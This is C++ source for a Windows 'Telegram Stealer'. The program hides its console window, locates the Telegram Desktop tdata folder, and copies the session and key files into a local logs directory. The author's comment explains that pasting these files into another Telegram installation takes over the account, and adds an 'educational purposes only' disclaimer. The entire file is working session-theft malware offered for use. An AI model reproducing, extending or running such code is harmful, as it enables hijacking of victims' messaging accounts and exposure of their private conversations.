/*
 * Telegram Stealer
 *
 * C++ 20, SDK 10
 * steals session files into the logs directory next to the executable
 * intended for educational purposes only, the author is not responsible
 * copy the received data to your Telegram directory, it is usually located
 * in /Users/%name%/AppData/LocalLow/Telegrm Desktop/tdata
 * coded by Nikait
*/


#include <fstream>
#include <windows.h>
#include <string>
#include <locale>


#pragma warning(disable: 4996)

#define AMOUNT_PATHS 3


unsigned int item = 0;
std::wstring appdata, tgpath, buffer, dir, _tgpath;
std::wstring paths[AMOUNT_PATHS];
std::wstring session_directories[2];

inline bool dirExists(const std::wstring& dirName_in);
std::wstring FindTgPath();
void write_maps(const std::wstring& path, const std::wstring& name, std::wstring dirname);
inline bool exist(const std::wstring& name);

int main() {
	// hide console
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	// setting encoding
	std::locale system("");
	std::locale::global(system);

	// getting path to AppData
	std::wstring path = _wgetenv(L"APPDATA");


	while (item < path.length()) {
		for (unsigned int i = item; i < path.length(); ++i) {
			buffer += path[i];
		}
		if (buffer == L"\\Roaming") {
			break;
		}
		buffer = L"";
		appdata += path[item];
		++item;
	}
	
	// all possible paths
	paths[0] = appdata + L"\\Local\\Telegram Desktop\\tdata\\";
	paths[1] = appdata + L"\\Roaming\\Telegram Desktop\\tdata\\";
	paths[2] = appdata + L"\\LocalLow\\Telegram Desktop\\tdata\\";

	//correct paths to tdata directory
	_tgpath = FindTgPath();
	tgpath = FindTgPath() + wchar_t('*');
	
	// perhaps Telegram is not installed
	// then the program will terminate
	if (tgpath == L"") return 0;

	WIN32_FIND_DATA FindFileData;
	HANDLE hf;
	hf = FindFirstFile(tgpath.c_str(), &FindFileData);
	item = 0;
	if (hf != INVALID_HANDLE_VALUE) {
		// checking and copying files
		do {
			dir = FindFileData.cFileName;

			// for directories
			if (dirExists(_tgpath + FindFileData.cFileName) && dir.length() == 16) {
				write_maps(_tgpath + dir + L"\\maps", FindFileData.cFileName, FindFileData.cFileName);
				session_directories[item] = _tgpath + FindFileData.cFileName;
			}

			// for files
			else if (dir.length() == 17) {
				_wmkdir(L"logs");
				std::wstring command = L"copy \"" + _tgpath + dir + L"\" logs\\" + dir;
				_wsystem(command.c_str());
			}
			++item;
		} while (FindNextFile(hf, &FindFileData) != 0);
		FindClose(hf);
	}

	return 0;
}

void write_maps(const std::wstring& path, const std::wstring& name, std::wstring dirname) {
	if (exist(path)) {

		std::wstring s = L"logs\\" + dirname;
		_wmkdir(s.c_str());
		std::wstring command = L"copy \"" + path + L"\" logs\\" + name + L"\\maps";
		_wsystem(command.c_str());
	}
}



inline bool exist(const std::wstring& name) {
	std::wifstream file(name);
	if (!file) return false;
	return true;
}



std::wstring FindTgPath() {
	for (int path = 0; path < 3; ++path) {
		if (dirExists(paths[path]))
			return paths[path];
	}
	return L"";
}

inline bool dirExists(const std::wstring& dirName_in) {
	DWORD ftyp = GetFileAttributesW(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true; 

	return false;
}